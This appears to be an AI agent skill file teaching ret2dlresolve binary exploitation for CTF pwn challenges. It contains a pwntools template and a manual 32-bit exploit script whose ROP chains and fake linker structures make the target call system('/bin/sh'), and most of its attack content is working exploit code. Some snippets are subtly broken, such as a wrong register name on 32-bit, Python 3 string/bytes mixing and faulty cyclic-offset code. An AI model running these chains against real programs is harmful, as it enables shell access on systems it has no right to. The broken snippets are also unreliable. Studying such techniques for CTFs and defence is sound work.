---
name: ret2dlresolve-exploit
description: How to craft ret2dlresolve exploits for binary exploitation challenges. Use this skill whenever the user mentions ret2dlresolve, dl_runtime_resolve, GOT/PLT manipulation, binary exploitation without syscall gadgets, CTF pwn challenges without libc leaks, or needs to call system() in a binary without Full Relro. Trigger for any binary exploitation task involving dynamic linking, symbol resolution, or when standard ROP/syscall techniques aren't available.
---

# Ret2dlresolve Exploitation

A skill for crafting ret2dlresolve attacks against binaries without Full Relro protection.

## When to Use This Technique

Use ret2dlresolve when:
- **No Full Relro** is present (check with `checksec` or `readelf -d`)
- **No syscall gadgets** available for ret2syscall or SROP
- **No libc leaks** possible to get function addresses
- You need to call `system()` or other libc functions
- The binary has a writable memory region (BSS, heap, or via `read`)

## Attack Overview

The ret2dlresolve technique fakes the dynamic linker's symbol resolution structures to make `_dl_runtime_resolve` resolve and call a target function (typically `system`) with your chosen arguments.

### Core Concept

1. **Fake structures** are written to a known memory location
2. **`_dl_runtime_resolve`** is called with pointers to these fake structures
3. The resolver **looks up the target symbol** (e.g., `system`) in your fake structures
4. The resolved address is **called with your arguments** (e.g., `'/bin/sh'`)

### Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Initial ROP chain                                        │
│    - Call read() to write fake structures to known location │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. Send fake structures via read()                          │
│    - .rel.plt entry (fake relocation)                       │
│    - .dynsym entry (fake symbol table)                      │
│    - .dynstr entry ("system\x00")                           │
│    - "/bin/sh\x00" string                                   │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. Second ROP chain                                         │
│    - Call _dl_runtime_resolve with fake .rel.plt offset     │
│    - Set $rdi = address of "/bin/sh"                        │
│    - Return address (doesn't matter, system() won't return) │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. _dl_runtime_resolve resolves "system" and calls it       │
│    - system("/bin/sh") executes → shell!                    │
└─────────────────────────────────────────────────────────────┘
```

## Pwntools Implementation

### Quick Start Template

```python
from pwn import *

# Setup
elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# Create the dlresolve payload
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

# Build the exploit chain
rop.raw('A' * offset)  # Fill to overwrite return address
rop.read(0, dlresolve.data_addr)  # Read fake structures to known location
rop.ret2dlresolve(dlresolve)      # Call dl_runtime_resolve with fake structures

# Send the exploit
p.sendline(rop.chain())
p.sendline(dlresolve.payload)     # Send the fake structures

p.interactive()
```

### Key Parameters

| Parameter | Description |
|-----------|-------------|
| `symbol` | The function to resolve (e.g., `'system'`, `'execve'`) |
| `args` | Arguments to pass to the resolved function |
| `data_addr` | Where to write the fake structures (must be writable) |

### Finding the Offset

```python
# Method 1: Use cyclic pattern
cyclic = context.cyclic
p.sendline(cyclic)
# After crash, find offset from register value
offset = cyclic.find(reg_value)

# Method 2: Use pwntools pattern
from pwn import *
offset = 76  # Adjust based on your binary
```

## Manual Implementation (32-bit)

When pwntools' `Ret2dlresolvePayload` isn't available or you need more control:

```python
from pwn import *

target = process('./vuln')
elf = ELF('vuln')

# Section addresses (get from readelf or objdump)
bss = 0x804a020
dynstr = 0x804822c
dynsym = 0x80481cc
relplt = 0x80482b0

# Function addresses
read_addr = elf.symbols['read']
resolve_addr = 0x80482f0  # _dl_runtime_resolve

# First payload: call read() to write fake structures
payload0 = "A" * 44  # Fill to return address
payload0 += p32(read_addr)
payload0 += p32(0x804843b)  # Return to vulnerable function
payload0 += p32(0)          # stdin
payload0 += p32(bss)        # Write to BSS
payload0 += p32(100)        # Size to read

target.send(payload0)

# Second payload: fake structures
# Calculate r_info (index into dynsym)
dynsym_offset = ((bss + 0xc) - dynsym) // 0x10
r_info = (dynsym_offset << 8) | 0x7

# Calculate dynstr offset
dynstr_index = (bss + 28) - dynstr

payload1 = p32(elf.got['alarm'])  # Target GOT entry
payload1 += p32(r_info)           # r_info
payload1 += p32(0x0)              # Padding
payload1 += p32(dynstr_index)     # dynsym st_name
payload1 += p32(0xde) * 3         # dynsym padding
payload1 += "system\x00"          # Symbol name
payload1 += "/bin/sh\x00"         # Argument string

target.send(payload1)

# Third payload: call _dl_runtime_resolve
binsh_addr = bss + 35
relplt_offset = bss - relplt

payload2 = "A" * 44
payload2 += p32(resolve_addr)
payload2 += p32(relplt_offset)    # .rel.plt offset
payload2 += p32(0xdeadbeef)       # Return address
payload2 += p32(binsh_addr)       # $rdi = "/bin/sh"

target.send(payload2)
target.interactive()
```

## Fake Structure Layout

The fake structures must match the expected format:

```
BSS (writable memory):
┌─────────────────────────────────────────────────────────────┐
│ 0x00: .rel.plt entry (8 bytes x2 on 64-bit)                │
│        - r_offset: GOT entry to overwrite                   │
│        - r_info: (dynsym_index << 8) | type                │
├─────────────────────────────────────────────────────────────┤
│ 0x10: .dynsym entry (16 bytes x2 on 64-bit)                │
│        - st_name: offset into .dynstr                       │
│        - st_info, st_other, st_shndx                        │
│        - st_value, st_size                                  │
├─────────────────────────────────────────────────────────────┤
│ 0x30: .dynstr entry                                        │
│        - "system\x00"                                       │
├─────────────────────────────────────────────────────────────┤
│ 0x40: Argument string                                      │
│        - "/bin/sh\x00"                                      │
└─────────────────────────────────────────────────────────────┘
```

## Common Pitfalls

### 1. Wrong Architecture
- **32-bit**: Use `p32()`, 4-byte addresses
- **64-bit**: Use `p64()`, 8-byte addresses
- Check with: `file ./vuln` or `readelf -h ./vuln`

### 2. Missing `read()` Call
The fake structures must be written to memory first:
```python
rop.read(0, dlresolve.data_addr)  # REQUIRED
```

### 3. Wrong Data Address
`data_addr` must be:
- Writable (BSS, heap, or via `read`)
- Known and controllable
- Not overwritten by other code

### 4. Incorrect r_info Calculation
```python
# 64-bit
r_info = (dynsym_index << 32) | 0x7
# 32-bit  
r_info = (dynsym_index << 8) | 0x7
```

### 5. GOT Entry Selection
Choose a GOT entry that:
- Exists in the binary
- Won't be called before your exploit
- Common choices: `alarm`, `puts`, `printf`

## Debugging Tips

### Check Protections
```bash
checksec --file=./vuln
# Look for: RELRO: No RELRO or Partial RELRO
```

### Verify Section Addresses
```bash
readelf -S ./vuln    # Section headers
readelf -d ./vuln    # Dynamic section
objdump -h ./vuln    # Section info
```

### GDB Debugging
```python
from pwn import *
elf = ELF('./vuln')
p = gdb.debug('./vuln', 'break *main')
# Or attach after sending payload
p = process('./vuln')
gdb.attach(p)
```

### Inspect Fake Structures
```python
# After sending payload1, check memory
p.context.arch = 'amd64'
fake_structs = p.read(bss, 100)
print(hexdump(fake_structs))
```

## When This Fails

If ret2dlresolve doesn't work, consider:

| Issue | Alternative |
|-------|-------------|
| Full Relro present | ret2libc, ROP |
| No writable memory | SROP, ret2syscall |
| PIE enabled | Leak addresses first |
| Canary present | Bypass or leak canary |

## References

- [Pwntools Ret2dlresolve Documentation](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html)
- [CTF Recipes - ret2dlresolve](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/ret2dlresolve)
- [ir0nstone Notes - ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)
- [GuyInATuxedo - 0CTF 2018 Babystack](https://guyinatuxedo.github.io/18-ret2_csu_dl/0ctf18_babystack/index.html)

## Quick Checklist

Before attempting ret2dlresolve:

- [ ] Binary has **No Full Relro** (check with `checksec`)
- [ ] **Writable memory** available (BSS, heap, or via `read`)
- [ ] **No syscall gadgets** needed (this is the use case)
- [ ] **No libc leaks** required (we fake the resolution)
- [ ] **GOT/PLT** present in binary
- [ ] **`_dl_runtime_resolve`** address known or findable
- [ ] **`read()`** or similar function available to write structures
- [ ] **Offset** to return address calculated correctly
